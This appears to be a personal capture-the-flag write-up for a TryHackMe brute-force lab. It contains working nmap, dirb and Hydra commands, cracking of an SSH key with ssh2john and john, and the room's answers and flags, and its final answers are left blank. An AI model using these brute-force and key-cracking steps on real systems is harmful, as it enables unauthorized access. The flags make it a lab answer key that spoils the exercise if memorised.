Let's use `nmap` to find open ports

```bash
sudo nmap -sS -sV -A -Pn 0.0.0.0
```

Fast way to scan ports with version

```bash
sudo nmap -F -Pn -sV 0.0.0.0
```

![[Captura desde 2024-09-02 18-42-10.png]]

How many ports are open?: `2`
What version of SSH is running?:  `OpenSSH 7.6p1`
What version of Apache is running?: `2.4.29`
Which Linux distribution is running?: `Ubuntu`

`dirb` to find folder and files in web server

```
dirb http://0.0.0.0
```

![[Captura desde 2024-09-02 19-16-18.png]]

What is the hidden directory?: `/admin`

`http://0.0.0.0/admin`

![[Captura desde 2024-09-02 19-25-20.png]]

![[Captura desde 2024-09-02 19-25-57.png]]

user name is`admin` from source page `/admin`

`hydra` tool for cracking password from website using wordlist

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 0.0.0.0 http-post-form "/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid" -t 64 -V
```

![[Captura desde 2024-09-02 19-30-22.png]]

username is `admin`
pasword is `xavier`

![[Captura desde 2024-09-02 19-43-39.png]]

Web flag: `THM{brut3_f0rce_is_e4sy}`

![[Captura desde 2024-09-02 19-47-34.png]]

```bash
wget http://0.0.0.0/admin/panel/id_rsa
```

Cracking password with using `ssh2john` 

```bash
chmod 600 id_rsa
ssh2john id_rsa > id_rsa.txt
```

![[Captura desde 2024-09-02 19-54-06.png]]

```bash
john id_rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

![[Captura desde 2024-09-02 19-56-19.png]]

`ssh` password is `rockinroll`
username is `john` from web page source for `ssh`

```bash
ssh -i id_rsa john@0.0.0.0
```

![[Captura desde 2024-09-02 20-00-44.png]]

![[Captura desde 2024-09-02 20-03-25.png]]

user.txt: `THM{a_password_is_not_a_barrier}`

short way of geting flag from root

```bash
sudo -l
sudo cat /root/root.txt
```

What is the root's password?: 


root.txt: 